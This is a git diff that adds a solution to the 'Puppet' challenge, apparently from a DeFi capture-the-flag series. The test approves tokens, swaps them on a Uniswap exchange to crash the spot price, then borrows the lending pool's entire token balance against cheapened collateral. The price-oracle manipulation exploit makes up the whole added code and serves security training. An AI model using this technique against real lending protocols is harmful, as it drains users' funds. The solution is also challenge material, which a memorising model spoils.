@@ -103,6 +103,29 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+        // Buy ETH with ERC20
+        // const outputAmount = 1
+        // const inputReserve = ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address));
+        // const outputReserve = ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address));
+
+        // Cost
+        // const numerator = outputAmount * inputReserve * 1000
+        // const denominator = (outputReserve - outputAmount) * 997
+        // const inputAmount = numerator / denominator + 1;
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(
+            ethers.utils.parseEther('9.9'),
+            ethers.utils.parseEther('1000'),
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        );
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ethers.utils.parseEther('20') });
     });
 
     after(async function () {
